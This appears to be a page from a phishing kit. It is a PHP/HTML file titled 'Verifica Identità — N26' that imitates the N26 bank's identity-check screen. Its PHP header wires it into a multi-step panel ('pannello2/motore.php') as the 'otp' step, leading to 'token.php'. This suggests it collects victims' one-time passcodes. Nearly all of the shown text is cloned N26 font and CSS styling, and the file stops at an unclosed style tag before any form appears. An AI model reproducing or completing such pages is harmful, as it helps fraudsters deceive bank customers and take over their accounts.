<?php
//INCLUDERE GENERALE
require("pannello2/generale.php");

//CUSTOM
$pagina=array('otp');
$numero = 2;
$prossima = "token.php";
$precedente ="index.php";

//INCLUDERE MOTORE
require("pannello2/motore.php");

?><html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="referrer" content="same-origin">

<title>Verifica Identità — N26</title>


<style>
    @font-face {
      font-family: 'N26';
      font-style: normal;
      font-weight: 400;
      font-display: swap;
      src:
        url('GT-America-Standard-Regular.latin.woff2') format('woff2');
      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
    }
    
    
    @font-face {
      font-family: 'N26';
      font-style: normal;
      font-weight: 500;
      font-display: swap;
      src:
        url('GT-America-Standard-Medium.latin.woff2') format('woff2');
      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
    }
    
    
    @font-face {
      font-family: 'N26';
      font-style: normal;
      font-weight: 600;
      font-display: swap;
      src:
        url('GT-America-Extended-Medium.latin.woff2') format('woff2');
      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
    }
    
    
    @font-face {
      font-family: 'N26';
      font-style: normal;
      font-weight: 700;
      font-display: swap;
      src:
        url('GT-America-Standard-Bold.latin.woff2') format('woff2');
      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
    }
    
    
    @font-face {
      font-family: 'N26';
      font-style: normal;
      font-weight: 400;
      font-display: swap;
      src:
        url('GT-America-Standard-Regular.latin-ext.woff2') format('woff2');
      unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
    }
    
    
    @font-face {
      font-family: 'N26';
      font-style: normal;
      font-weight: 500;
      font-display: swap;
      src:
        url('GT-America-Standard-Medium.latin-ext.woff2') format('woff2');
      unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
    }
    
    
    @font-face {
      font-family: 'N26';
      font-style: normal;
      font-weight: 600;
      font-display: swap;
      src:
        url('GT-America-Extended-Medium.latin-ext.woff2') format('woff2');
      unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
    }
    
    
    @font-face {
      font-family: 'N26';
      font-style: normal;
      font-weight: 700;
      font-display: swap;
      src:
        url('GT-America-Standard-Bold.latin-ext.woff2') format('woff2');
      unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
    }
</style>

<style data-fela-id="" data-fela-rehydration="318" data-fela-type="STATIC">
    :root {-webkit-font-smoothing: antialiased;-moz-osx-font-smoothing: grayscale;--duration: 1;--responsive-base: 1;--background-default: rgb(255, 255, 255); --background-alternate: rgb(249, 249, 249); --background-screen: rgb(249, 249, 249); --background-button-primary-active: rgb(72, 172, 152); --background-button-primary-pressed: rgb(72, 172, 152); --background-button-primary-disabled: rgb(232, 242, 238); --background-button-secondary: rgb(255, 255, 255); --background-container-teal: rgb(72, 172, 152); --background-container-rhubarb: rgb(203, 124, 122); --background-container-wheat: rgb(200, 157, 88); --background-container-petrol: rgb(43, 105, 122); --background-container-secondary-teal: rgb(204, 227, 218); --background-container-secondary-rhubarb: rgb(235, 214, 214); --background-container-secondary-wheat: rgb(235, 221, 204); --background-container-secondary-petrol: rgb(204, 220, 226); --background-container-light: rgb(242, 242, 242); --background-container-light-teal: rgb(232, 242, 238); --background-container-light-rhubarb: rgb(242, 228, 228); --background-container-light-wheat: rgb(242, 236, 225); --background-container-light-petrol: rgb(233, 238, 242); --background-container-lightest-petrol: rgb(233, 238, 242); --background-container-dark-teal: rgb(42, 126, 109); --background-container-dark-wheat: rgb(140, 108, 58); --background-container-dark-petrol: rgb(9, 61, 77); --background-container-dark-rhubarb: rgb(158, 89, 87); --background-container-alpha-teal: rgb(72, 172, 152, 0.5); --background-container-alpha-wheat: rgb(205, 163, 95, 0.5); --background-container-alpha-petrol: rgba(38, 102, 120, 0.5); --background-container-alpha-rhubarb: rgb(203, 124, 122, 0.5); --background-light-error-red: rgb(248, 237, 237); --background-info-card: rgb(233, 233, 233); --typography-primary-default: rgb(27, 27, 27); --typography-primary-inverted: rgb(255, 255, 255); --typography-primary-consistent: rgb(27, 27, 27); --typography-primary-inverted-consistent: rgb(255, 255, 255); --typography-secondary-default: rgb(105, 105, 105); --typography-secondary-consistent: rgb(105, 105, 105); --typography-disabled: rgb(171, 171, 171); --typography-interactive-primary-teal-consistent: rgb(54, 161, 139); --typography-interactive-primary-wheat-consistent: rgb(200, 157, 88); --typography-interactive-primary-petrol-default: rgb(43, 105, 122); --typography-interactive-primary-petrol-consistent: rgb(43, 105, 122); --typography-interactive-primary-rhubarb-default: rgb(179, 93, 91); --typography-interactive-primary-rhubarb-consistent: rgb(179, 93, 91); --typography-interactive-secondary-teal-default: rgb(31, 117, 96); --typography-interactive-secondary-teal-consistent: rgb(31, 117, 96); --typography-interactive-secondary-wheat-consistent: rgb(166, 121, 49); --typography-interactive-secondary-petrol-default: rgb(32, 91, 107); --typography-interactive-secondary-petrol-consistent: rgb(32, 91, 107); --typography-interactive-secondary-rhubarb-consistent: rgb(142, 70, 68); --typography-positive-amount: rgb(54, 161, 139); --border-primary-gray: rgb(233, 233, 233); --border-primary-teal: rgb(31, 117, 96); --border-primary-petrol: rgb(24, 81, 97); --border-primary-wheat: rgb(128, 91, 32); --border-primary-rhubarb: rgb(142, 70, 68); --border-secondary-gray: rgb(150, 150, 150); --border-secondary-teal: rgb(54, 161, 139); --border-secondary-petrol: rgb(43, 105, 122); --border-secondary-wheat: rgb(166, 121, 49); --border-secondary-rhubarb: rgb(179, 93, 91); --divider-default: rgb(233, 233, 233); --divider-default-consistent: rgb(233, 233, 233); --background-screen-default: rgb(255, 255, 255); --background-container-primary-default: rgb(255, 255, 255); --background-container-primary-teal: rgb(54, 161, 139); --background-container-primary-wheat: rgb(200, 157, 88); --background-container-primary-petrol: rgb(43, 105, 122); --background-container-primary-rhubarb: rgb(179, 93, 91); --background-container-primary-gray: rgb(150, 150, 150); --background-container-primary-hovered: rgb(249, 249, 249); --background-container-primary-pressed: rgb(242, 242, 242); --background-elevated-container-primary-default: rgb(255, 255, 255); --background-container-secondary-gray: rgb(233, 233, 233); --background-container-tertiary-teal: rgb(232, 242, 238); --background-container-tertiary-teal-pressed: rgb(204, 227, 218); --background-container-tertiary-wheat: rgb(242, 236, 225); --background-container-tertiary-wheat-pressed: rgb(235, 221, 204); --background-container-tertiary-petrol: rgb(233, 238, 242); --background-container-tertiary-petrol-pressed: rgb(204, 220, 226); --background-container-tertiary-rhubarb: rgb(242, 232, 232); --background-container-tertiary-rhubarb-pressed: rgb(235, 214, 214); --background-container-tertiary-gray: rgb(242, 242, 242); --background-container-tertiary-gray-pressed: rgb(233, 233, 233); --background-error: rgb(242, 232, 232); --background-positive-amount: rgb(232, 242, 238); --background-navigation-bottom: rgb(255, 255, 255); --background-button-primary-teal-default: rgb(54, 161, 139); --background-button-primary-teal-pressed: rgb(31, 117, 96); --background-button-primary-teal-disabled: rgb(130, 196, 178); --background-button-primary-teal-hover-and-focused: rgb(54, 161, 139); --background-button-primary-wheat-default: rgb(166, 121, 49); --background-button-primary-wheat-pressed: rgb(128, 91, 32); --background-button-primary-wheat-disabled: rgb(225, 197, 161); --background-button-primary-wheat-hover-and-focused: rgb(166, 121, 49); --background-button-primary-petrol-default: rgb(43, 105, 122); --background-button-primary-petrol-pressed: rgb(24, 81, 97); --background-button-primary-petrol-disabled: rgb(204, 220, 226); --background-button-primary-petrol-hover-and-focused: rgb(43, 105, 122); --background-button-primary-rhubarb-default: rgb(179, 93, 91); --background-button-primary-rhubarb-pressed: rgb(142, 70, 68); --background-button-primary-rhubarb-disabled: rgb(222, 172, 171); --background-button-primary-rhubarb-hover-and-focused: rgb(179, 93, 91); --background-button-secondary-default: rgb(255, 255, 255); --background-button-secondary-pressed: rgb(242, 242, 242); --background-button-tertiary-teal-pressed: rgb(232, 242, 238); --background-button-tertiary-wheat-pressed: rgb(242, 236, 225); --background-button-tertiary-petrol-pressed: rgb(233, 238, 242); --background-button-tertiary-rhubarb-pressed: rgb(242, 232, 232); --background-button-tertiary-hover-and-focused: rgb(255, 255, 255); --overlay-default: rgb(27, 27, 27); --overlay-default-consistent: rgb(27, 27, 27); --shadow-default: rgba(0, 0, 0, 0.2); --iconography-primary-default: rgb(27, 27, 27); --iconography-primary-consistent: rgb(27, 27, 27); --iconography-primary-default-inverted: rgb(255, 255, 255); --iconography-primary-inverted-consistent: rgb(255, 255, 255); --iconography-secondary-default: rgb(105, 105, 105); --iconography-disabled: rgb(171, 171, 171); --iconography-interactive-primary-teal-consistent: rgb(54, 161, 139); --iconography-interactive-primary-teal-disabled: rgb(130, 196, 178); --iconography-interactive-primary-petrol-default: rgb(43, 105, 122); --iconography-interactive-primary-petrol-consistent: rgb(43, 105, 122); --iconography-interactive-primary-petrol-disabled: rgb(121, 161, 173); --iconography-interactive-primary-rhubarb-default: rgb(179, 93, 91); --iconography-interactive-primary-rhubarb-consistent: rgb(179, 93, 91); --iconography-interactive-primary-rhubarb-disabled: rgb(222, 172, 171); --iconography-interactive-secondary-teal-default: rgb(31, 117, 96); --iconography-interactive-secondary-teal-consistent: rgb(31, 117, 96); --iconography-interactive-secondary-petrol-default: rgb(32, 91, 107); --iconography-interactive-secondary-petrol-consistent: rgb(32, 91, 107); --progress-background: rgb(204, 227, 218); --progress-foreground: rgb(54, 161, 139); --shimmer-loader-background: rgb(242, 242, 242); --shimmer-loader-foreground: rgb(249, 249, 249); --bright-overlay: rgb(255, 255, 255, 0.75); --mild-overlay: rgba(0, 0, 0, 0.075); --distinct-overlay: rgba(0, 0, 0, 0.2); --primary-focus: rgba(54, 161, 139, 0.6); --typography-default: rgb(18, 18, 18); --typography-default-inverted: rgb(255, 255, 255); --typography-default-consistent: rgb(18, 18, 18); --typography-default-inverted-consistent: rgb(255, 255, 255); --typography-interactive-rhubarb: rgb(203, 124, 122); --typography-interactive-default: rgb(72, 172, 152); --typography-interactive-teal: rgb(72, 172, 152); --typography-extra-light: rgb(191, 191, 191); --typography-light: rgb(116, 116, 116); --typography-error: rgb(180, 75, 70); --divider-teal: rgb(72, 172, 152); --divider-error: rgb(180, 75, 70); --divider-dark: rgb(116, 116, 116); --iconography-default: rgb(18, 18, 18); --iconography-default-inverted: rgb(255, 255, 255); --iconography-light: rgb(116, 116, 116); --iconography-bright: rgb(233, 233, 233); --iconography-action: rgb(72, 172, 152); --iconography-rhubarb: rgb(179, 93, 91); --shimmer-background: rgb(233, 233, 233); --shimmer-foreground: rgb(249, 249, 249); --deprecated-gray: rgb(201, 201, 201); /* 1 */--spacing-5-xl: 4.4em; --spacing-4-xl: 3.85em; --spacing-3-xl: 3.3em; --spacing-2-xl: 2.75em; --spacing-xl: 2.2em; --spacing-l: 1.65em; --spacing-m: 1.1em; --spacing-s: 0.88em; --spacing-xs: 0.825em; --spacing-2-xs: 0.55em; --spacing-3-xs: 0.275em; --spacing-4-xs: 0.22em; --spacing-5-xs: 0.165em; --spacing-6-xs: 0.11em;--font-size-6-xl: 2.8rem; --font-size-5-xl: 2.2rem; --font-size-4-xl: 2rem; --font-size-3-xl: 1.8rem; --font-size-2-xl: 1.5rem; --font-size-xl: 1.3rem; --font-size-l: 1.2rem; --font-size-m: 1.1rem; --font-size-s: 1rem; --font-size-xs: 0.9rem; --font-size-2-xs: 0.85rem; --font-size-3-xs: 0.8rem; --font-size-4-xs: 0.7rem; --font-size-5-xs: 0.6rem;--line-height-5-xl: 1.8; --line-height-4-xl: 1.7; --line-height-3-xl: 1.6; --line-height-2-xl: 1.5; --line-height-xl: 1.45; --line-height-l: 1.4; --line-height-m: 1.2; --line-height-s: 1.1; --line-height-xs: 1;--width-7-xl: 88ch; --width-6-xl: 77ch; --width-5-xl: 71.5ch; --width-4-xl: 66ch; --width-3-xl: 49.5ch; --width-2-xl: 48.4ch; --width-xl: 44ch; --width-l: 41.8ch; --width-m: 33ch; --width-s: 27.5ch; --width-xs: 22ch; --width-2-xs: 15.4ch; --width-3-xs: 13.2ch; --width-4-xs: 11ch; --width-5-xs: 8.8ch; --width-6-xs: 5.5ch; --width-7-xs: 3.3ch; --width-8-xs: 1.1ch; --width-9-xs: 0.825ch; --width-10-xs: 0.55ch; --width-11-xs: 0.33ch; --width-12-xs: 0.11ch;--border-radius-5-xl: 34px; --border-radius-4-xl: 27px; --border-radius-3-xl: 22px; --border-radius-2-xl: 14px; --border-radius-xl: 10px; --border-radius-l: 8px; --border-radius-m: 6px; --border-radius-s: 5px; --border-radius-xs: 4px; --border-radius-2-xs: 2px; --border-radius-credit-card: 3% / 5%; --border-radius-half: 50%; --border-radius-circle: 100vw;scroll-behavior: smooth; /* 2 */}@media (max-width: 767px) {:root {--responsive-base: 0.8;touch-action: manipulation;}}@media (prefers-reduced-motion: reduce) {:root { --duration: 0; scroll-behavior: auto }}*, ::before, ::after{box-sizing:inherit}html{background-color:var(--background-alternate);box-sizing:border-box;font-weight:400;min-height:100%;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}html, body, [id="root"]{display:-webkit-box;display:-moz-box;display:-ms-flexbox;display:-webkit-flex;display:flex;flex-direction:column;-webkit-box-orient:vertical;-webkit-box-direction:normal;flex-grow:1;flex-shrink:1;flex-basis:auto}body{font-family:N26, sans-serif;font-size:112.5%;line-height:1.4;color:var(--typography-default);overflow-x:hidden;text-underline-position:under;margin-top:0;margin-right:0;margin-bottom:0;margin-left:0}img{display:block;height:auto;max-width:100%;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none}main{display:block}[hidden]{display:none}a{background-color:transparent;-webkit-text-decoration-skip:objects}svg:not(:root){overflow:hidden}hr{overflow:visible}button, input, select, textarea{font:inherit;margin-top:0;margin-right:0;margin-bottom:0;margin-left:0}button, input{overflow:visible}button, select{text-transform:none}button, html [type="button"], [type="reset"], [type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{padding-top:0;padding-right:0;padding-bottom:0;padding-left:0;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline-width:1px;outline-style:dotted;outline-color:ButtonText}fieldset{padding-top:0.35em;padding-right:0.625em;padding-bottom:var(--spacing-xs);padding-left:0.625em;margin-top:0;margin-right:2px;margin-bottom:0;margin-left:2px;border-top-width:1px;border-right-width:1px;border-bottom-width:1px;border-left-width:1px;border-top-style:solid;border-right-style:solid;border-bottom-style:solid;border-left-style:solid;border-top-color:rgb(192, 192, 192);border-right-color:rgb(192, 192, 192);border-bottom-color:rgb(192, 192, 192);border-left-color:rgb(192, 192, 192)}legend{box-sizing:border-box;display:table;max-width:100%;white-space:normal;color:inherit;padding-top:0;padding-right:0;padding-bottom:0;padding-left:0}textarea{overflow:auto}[type="checkbox"], [type="radio"]{padding-top:0;padding-right:0;padding-bottom:0;padding-left:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-cancel-button,[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-input-placeholder{color:inherit;opacity:0.54}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}:-webkit-autofill,:-webkit-autofill:hover,:-webkit-autofill:focus,:-webkit-autofill:active{transition:background-color 1000000ms, color 1000000ms;-webkit-transition:background-color 1000000ms, color 1000000ms;-moz-transition:background-color 1000000ms, color 1000000ms}:required:-moz-ui-invalid{box-shadow:none}.visually-hidden{border-top-width:0 !important;border-right-width:0 !important;border-bottom-width:0 !important;border-left-width:0 !important;clip:rect(1px, 1px, 1px, 1px) !important;height:1px !important;overflow:hidden !important;padding-top:0 !important;padding-right:0 !important;padding-bottom:0 !important;padding-left:0 !important;position:absolute !important;white-space:nowrap !important;width:1px !important}strong, b{font-weight:500}audio, canvas, iframe, img, svg, video{vertical-align:middle}p{margin-top:0;margin-bottom:var(--spacing-m)}
</style>

<style data-fela-id="" data-fela-rehydration="318" data-fela-type="RULE">
    .a{border-top-width:0 !important}.b{border-right-width:0 !important}.c{border-bottom-width:0 !important}.d{border-left-width:0 !important}.e{clip:rect(1px, 1px, 1px, 1px) !important}.f{height:1px !important}.g{overflow:hidden !important}.h{padding-top:0 !important}.i{padding-right:0 !important}.j{padding-bottom:0 !important}.k{padding-left:0 !important}.l{position:absolute !important}.m{white-space:nowrap !important}.n{width:1px !important}.o{width:100%}.p{display:-webkit-box;display:-moz-box;display:-ms-flexbox;display:-webkit-flex;display:flex}.q{flex-direction:column;-webkit-box-orient:vertical;-webkit-box-direction:normal}.r{flex-grow:1}.s{flex-shrink:1}.t{flex-basis:auto}.u{align-items:center;-webkit-box-align:center}.v{position:relative}.w{margin-top:auto}.x{margin-right:auto}.y{margin-bottom:auto}.z{margin-left:auto}.aj{z-index:1}.ak{background-color:var(--background-container-secondary-teal)}.al{transition-property:background-color;-webkit-transition-property:background-color;-moz-transition-property:background-color}.am{transition-duration:calc(var(--duration) * 350ms)}.ao{padding-top:var(--spacing-l)}.ap{padding-right:var(--spacing-s)}.aq{padding-bottom:var(--spacing-l)}.ar{padding-left:var(--spacing-s)}.as{flex-basis:100%}.at{background-color:var(--background-default)}.au{width:auto}.av{min-height:24rem}.aw{align-items:stretch;-webkit-box-align:stretch}.bn{text-align:center}.bo{justify-content:center;-webkit-box-pack:center}.bp{max-width:100%}.bq{border-radius:var(--border-radius-xl)}.br{border-top-width:1px}.bs{border-right-width:1px}.bt{border-bottom-width:1px}.bu{border-left-width:1px}.bv{border-top-style:solid}.bw{border-right-style:solid}.bx{border-bottom-style:solid}.by{border-left-style:solid}.bz{border-top-color:var(--divider-default)}.ca{border-right-color:var(--divider-default)}.cb{border-bottom-color:var(--divider-default)}.cc{border-left-color:var(--divider-default)}.cd{padding-top:var(--spacing-m)}.ce{padding-bottom:var(--spacing-m)}.cf{max-width:21.5rem}.cg::after{content:""}.ch::after{display:block}.ci::after{width:21.5rem}.cj{margin-top:0}.ck{margin-bottom:0}.cl{padding-top:var(--spacing-3-xs)}.cm{padding-right:var(--spacing-3-xs)}.cn{padding-bottom:var(--spacing-3-xs)}.co{padding-left:var(--spacing-3-xs)}.cp{border-top-width:0}.cq{border-right-width:0}.cr{border-bottom-width:0}.cs{border-left-width:0}.ct{background-color:transparent}.cu{font-style:inherit}.cv{font-weight:inherit}.cw{font-size:inherit}.cx{line-height:inherit}.cy{font-family:inherit}.cz{color:inherit}.da{text-decoration:none}.db{text-align:left}.dc{cursor:pointer}.dd{display:block}.de{width:5rem}.di{margin-top:calc(var(--spacing-3-xs) * -1)}.dj{margin-bottom:calc(var(--spacing-l) - var(--spacing-3-xs))}.dk{fill:currentcolor}.dl{max-height:2.2rem}.dm{border-radius:var(--border-radius-l)}.dn{box-shadow:none}.do{font-size:var(--font-size-s)}.dp{line-height:1.3333333333333333}.dq{color:var(--typography-default)}.dr[disabled]{cursor:not-allowed}.ds[disabled]{opacity:0.5}.dt[disabled]{pointer-events:none}.du[readonly]{cursor:not-allowed}.dv[readonly]{opacity:0.5}.dw[readonly]{pointer-events:none}.dx + ul{margin-top:6px}.dy + ul{margin-right:-1px}.dz + ul{margin-bottom:0}.ea + ul{margin-left:-1px}.eb + ul{padding-top:0}.ec + ul{padding-right:0}.ed + ul{padding-bottom:0}.ee + ul{padding-left:0}.ef + ul{list-style:none}.eg + ul> ::before{position:absolute}.eh + ul> ::before{content:"\200B"}.ei + ul{background-color:var(--background-default)}.ej + ul{box-shadow:0 2px 4px 0 rgba(0, 0, 0, 0.1)}.ek + ul{border-radius:var(--border-radius-l)}.el + ul{position:absolute}.em + ul{left:0}.en + ul{right:0}.eo + ul{z-index:50}.er + ul{border-top-width:1px}.es + ul{border-right-width:1px}.et + ul{border-bottom-width:1px}.eu + ul{border-left-width:1px}.ev + ul{border-top-style:solid}.ew + ul{border-right-style:solid}.ex + ul{border-bottom-style:solid}.ey + ul{border-left-style:solid}.ez + ul{border-top-color:var(--divider-default)}.fa + ul{border-right-color:var(--divider-default)}.fc + ul{border-bottom-color:var(--divider-default)}.fd + ul{border-left-color:var(--divider-default)}.fe + ul > li:not(:last-child){border-bottom-width:1px}.ff + ul > li:not(:last-child){border-bottom-style:solid}.fg + ul > li:not(:last-child){border-bottom-color:var(--divider-default)}.fh + ul > li{font-size:var(--font-size-s)}.fi + ul > li{text-align:left}.fj + ul > li:first-child{border-top-left-radius:var(--border-radius-l)}.fk + ul > li:first-child{border-top-right-radius:var(--border-radius-l)}.fl + ul > li:last-child{border-bottom-left-radius:var(--border-radius-l)}.fm + ul > li:last-child{border-bottom-right-radius:var(--border-radius-l)}.fn + ul > li:hover{background-color:var(--background-container-teal)}.fo + ul > li:hover{color:var(--typography-default-inverted)}.fp + ul > li:hover:not(:last-child){border-bottom-width:1px}.fq + ul > li:hover:not(:last-child){border-bottom-style:solid}.fr + ul > li:hover:not(:last-child){border-bottom-color:rgba(255, 255, 255, 0.4)}.fs + ul > li:hover{cursor:pointer}.ft + ul > li{padding-top:var(--spacing-2-xs)}.fu + ul > li{padding-right:var(--spacing-xs)}.fv + ul > li{padding-bottom:var(--spacing-2-xs)}.fw + ul > li{padding-left:var(--spacing-xs)}.fx + ul > [aria-selected="true"]{background-color:var(--background-container-teal)}.fy + ul > [aria-selected="true"]{color:var(--typography-default-inverted)}.fz + ul > [aria-selected="true"]:not(:last-child){border-bottom-width:1px}.ga + ul > [aria-selected="true"]:not(:last-child){border-bottom-style:solid}.gb + ul > [aria-selected="true"]:not(:last-child){border-bottom-color:rgba(255, 255, 255, 0.4)}.gc + ul mark{background-color:transparent}.gd + ul mark{color:inherit}.ge + ul mark{border-bottom-width:1px}.gf + ul mark{border-bottom-style:solid}.gg::placeholder{transition-property:opacity;-webkit-transition-property:opacity;-moz-transition-property:opacity}.gh::placeholder{transition-duration:calc(var(--duration) * 0)}.gi::placeholder{opacity:0}.gj::-ms-input-placeholder{opacity:0.8}.gk::-ms-input-placeholder{color:rgb(150, 150, 150)}.gl{-webkit-appearance:none;-moz-appearance:none;appearance:none}.gm{height:100%}.gn[type="date"]::-webkit-datetime-edit{color:transparent}.go{padding-top:var(--spacing-xl)}.gp{padding-bottom:var(--spacing-xs)}.gq{outline-style:none}.gr{height:4em}.gs{transition-property:box-shadow, border-color;-webkit-transition-property:box-shadow, border-color;-moz-transition-property:box-shadow, border-color}.gt{transition-duration:calc(var(--duration) * 400ms)}.gu{-webkit-tap-highlight-color:transparent}.hk{margin-bottom:var(--spacing-s)}.hl{color:var(--typography-light)}.hm{position:absolute}.hn{top:50%}.ho{left:var(--spacing-s)}.hp{transition-property:transform;-webkit-transition-property:transform;-moz-transition-property:transform}.hq{transition-duration:calc(var(--duration) * 300ms)}.hr{transform-origin:top left}.hs{transform:translateY(-50%)}.ht{margin-left:-2px}.hu{cursor:-webkit-text;cursor:text}.hv{pointer-events:none}.hw{padding-right:var(--spacing-xs)}.hx{font-weight:500}.hy{color:var(--typography-interactive-default)}.id{white-space:nowrap}.ie{margin-right:calc(var(--spacing-3-xs) * -1)}.if{margin-bottom:calc(var(--spacing-3-xs) * -1)}.ih{margin-left:calc(var(--spacing-3-xs) * -1)}.ii:not(:empty){margin-bottom:var(--spacing-s)}.ij{background-color:var(--background-container-teal)}.ik{color:var(--typography-default-inverted)}.il{display:inline-block}.im{transition-duration:calc(var(--duration) * 250ms)}.in{line-height:var(--line-height-l)}.iq::after{position:absolute}.ir::after{top:-4px}.is::after{bottom:-4px}.it::after{right:-4px}.iu::after{left:-4px}.iv::after{opacity:0}.iw::after{box-shadow:0 0 0 2px var(--primary-focus)}.ix::after{pointer-events:none}.iy::after{border-radius:var(--border-radius-xl)}.iz::after{transition-duration:inherit}.jf{border-top-width:2px}.jg{border-right-width:2px}.jh{border-bottom-width:2px}.ji{border-left-width:2px}.jj{border-top-color:transparent}.jk{border-right-color:transparent}.jl{border-bottom-color:transparent}.jm{border-left-color:transparent}.jn{padding-top:var(--spacing-xs)}.jo{padding-right:var(--spacing-l)}.jp{padding-left:var(--spacing-l)}.jq{margin-top:var(--spacing-2-xs)}.jr{z-index:50}.js{min-height:60px}.jt{align-items:flex-start;-webkit-box-align:start}.jw{padding-right:var(--spacing-m)}.jx{padding-left:var(--spacing-m)}.jy{font-size:var(--font-size-3-xs)}.kc{height:var(--spacing-m)}.kd{width:var(--spacing-m)}.ke{vertical-align:-2px}.kf{overflow:hidden}.kg{fill:none}.kh{stroke:currentcolor}.ki{stroke-width:2px}.kj{vertical-align:baseline}.kk{width:inherit}.kl{height:inherit}.km{border-radius:0}.kn> option{color:var(--typography-default)}.ko> option{background-color:var(--background-alternate)}.kp{padding-top:0}.kq{padding-bottom:0}.kr{padding-left:0}.ks{transition-property:text-indent;-webkit-transition-property:text-indent;-moz-transition-property:text-indent}.ky[aria-invalid="true"]{border-top-color:var(--divider-error)}.kz[aria-invalid="true"]{border-right-color:var(--divider-error)}.la[aria-invalid="true"]{border-bottom-color:var(--divider-error)}.lb[aria-invalid="true"]{border-left-color:var(--divider-error)}.lc{border-bottom-style:none}.ld{width:0.6em}.le{right:0}.lf{fill:var(--iconography-light)}.lg{transform:translateY(-40%)}.hj:hover{box-shadow:0 2px 4px 0 rgba(0, 0, 0, 0.1)}.io:hover{box-shadow:0 5px 10px rgba(0, 0, 0, 0.2)}.ip:hover{transform:translateY(-2px)}.ka:hover{color:var(--typography-interactive-default)}.gv:focus-within{box-shadow:0 2px 4px 0 rgba(0, 0, 0, 0.1), inset 0 0 0 1px var(--divider-teal)}.gw:focus-within:hover{box-shadow:0 2px 4px 0 rgba(0, 0, 0, 0.1), inset 0 0 0 1px var(--divider-teal)}.gx:focus-within{border-top-width:1px}.gy:focus-within{border-right-width:1px}.gz:focus-within{border-bottom-width:1px}.ha:focus-within{border-left-width:1px}.hb:focus-within{border-top-style:solid}.hc:focus-within{border-right-style:solid}.hd:focus-within{border-bottom-style:solid}.he:focus-within{border-left-style:solid}.hf:focus-within{border-top-color:var(--divider-teal)}.hg:focus-within{border-right-color:var(--divider-teal)}.hh:focus-within{border-bottom-color:var(--divider-teal)}.hi:focus-within{border-left-color:var(--divider-teal)}.df:focus{border-radius:var(--border-radius-m)}.dg:focus{box-shadow:0 0 0 3px var(--primary-focus)}.dh:focus{outline-style:none}.ja:focus::after{opacity:1}.kt:focus{box-shadow:none}.ku:focus{border-top-color:var(--primary-focus)}.kv:focus{border-right-color:var(--primary-focus)}.kw:focus{border-bottom-color:var(--primary-focus)}.kx:focus{border-left-color:var(--primary-focus)}.kb:active{color:var(--typography-interactive-default)}
</style>

<style data-fela-id="" data-fela-rehydration="318" data-fela-type="RULE" media="(min-width: 768px)">
    .af{margin-top:auto}.ag{margin-right:auto}.ah{margin-bottom:auto}.ai{margin-left:auto}.bh{border-radius:var(--border-radius-xl)}.bj{padding-top:var(--spacing-m)}.bk{padding-right:var(--spacing-s)}.bl{padding-bottom:var(--spacing-m)}.bm{padding-left:var(--spacing-s)}.ep + ul{overflow-y:auto}.eq + ul{max-height:10em}.ju{flex-direction:row;-webkit-box-orient:horizontal;-webkit-box-direction:normal}.jv{align-items:center;-webkit-box-align:center}.jz{margin-right:var(--spacing-m)}
</style>

<style data-fela-id="" data-fela-rehydration="318" data-fela-type="RULE" media="(max-width: 767px)">
    .ab{flex-grow:1}.ac{flex-shrink:1}.ae{flex-basis:auto}.an{background:var(--background-alternate)}.ax{text-align:center}.ay{background:transparent}.az{border-top-style:none}.ba{border-right-style:none}.bb{border-bottom-style:none}.bc{border-left-style:none}.bd{padding-top:0}.be{padding-right:0}.bf{padding-bottom:0}.bg{padding-left:0}.hz{padding-top:var(--spacing-3-xs)}.ia{padding-right:var(--spacing-3-xs)}.ib{padding-bottom:var(--spacing-3-xs)}.ic{padding-left:var(--spacing-3-xs)}.jb{padding-top:var(--spacing-xs)}.jc{padding-right:var(--spacing-xs)}.jd{padding-bottom:var(--spacing-xs)}.je{padding-left:var(--spacing-xs)}
</style>

<style data-rh="true">
